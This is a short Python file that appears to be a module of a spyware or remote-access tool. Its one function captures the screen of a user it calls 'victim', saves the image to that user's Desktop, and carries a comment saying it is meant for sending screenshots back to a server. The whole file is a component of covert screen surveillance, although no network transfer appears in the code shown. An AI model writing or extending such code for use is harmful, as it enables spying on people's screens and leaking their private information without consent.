import os
from os import path
import pyautogui


def screenshot(filenamesave):
    victim = pyautogui.screenshot()
    filenameformat = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop\\')
    victim.save(filenameformat + filenamesave) 
    # Please use this function to send screenshots back to server.
